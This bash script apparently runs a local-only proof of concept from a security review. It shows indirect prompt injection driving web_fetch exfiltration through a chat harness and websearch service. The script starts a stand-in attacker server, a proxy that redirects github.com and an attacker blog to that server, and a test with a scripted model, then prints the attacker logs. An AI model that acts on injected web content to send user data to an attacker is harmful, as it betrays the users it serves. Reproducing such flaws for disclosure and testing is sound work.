#!/bin/bash
# Local-only PoC runner: indirect prompt injection -> web_fetch exfiltration
# through the Tinfoil Chat harness and the websearch service. See README.md.
set -euo pipefail
source /root/tinfoil-review/env.sh
W=/root/tinfoil-review/work/harness-tools-injection
POC=$W/poc
OUT=$POC/out
mkdir -p "$OUT"
ATT=${ATT:-20311}; EXA=${EXA:-20312}; WS=${WS:-20313}

echo "== building"
(cd "$POC/exastub" && go build -o "$OUT/exastub" .)
(cd "$POC/attacker" && go build -o "$OUT/attacker" .)
(cd "$W/confidential-websearch" && GOWORK=off go build -o "$OUT/poc-websearch" ./cmd/poc-websearch)

cleanup() { kill ${PIDS:-} 2>/dev/null || true; }
trap cleanup EXIT
PIDS=""

echo "== starting attacker web server on 127.0.0.1:$ATT"
"$OUT/attacker" -listen 127.0.0.1:$ATT -log "$OUT/attacker.log" > "$OUT/attacker.stdout" 2>&1 &
PIDS="$PIDS $!"

echo "== starting Exa/Cloudflare stand-in proxy on 127.0.0.1:$EXA"
"$OUT/exastub" -listen 127.0.0.1:$EXA -ca-out "$OUT/ca.pem" -log "$OUT/exastub.log" \
  -crawl-map "github.com=127.0.0.1:$ATT,attacker-blog.example=127.0.0.1:$ATT" > "$OUT/exastub.stdout" 2>&1 &
PIDS="$PIDS $!"
sleep 1

echo "== starting websearch service (shipped packages) on 127.0.0.1:$WS"
HTTPS_PROXY=http://127.0.0.1:$EXA SSL_CERT_FILE="$OUT/ca.pem" EXA_API_KEY=poc-dummy-exa-key \
  CLOUDFLARE_API_TOKEN=poc-dummy-cf-token LISTEN_ADDR=127.0.0.1:$WS \
  "$OUT/poc-websearch" > "$OUT/websearch.stdout" 2>&1 &
PIDS="$PIDS $!"
for i in $(seq 1 30); do curl -fsS "http://127.0.0.1:$WS/health" >/dev/null 2>&1 && break; sleep 0.5; done

echo "== running the harness PoC test (shipped harness code + scripted model)"
(cd "$W/confidential-tinfoil-harness" && POC_WEBSEARCH_ADDR=127.0.0.1:$WS POC_ATTACKER_LOG="$OUT/attacker.log" \
  GOWORK=off go test -run 'TestPoC_' -v -count=1 . 2>&1 | tee "$OUT/harness-test.log")

echo "== websearch service log"; cat "$OUT/websearch.stdout"
echo "== exastub log"; cat "$OUT/exastub.log"
echo "== attacker log"; cat "$OUT/attacker.log"
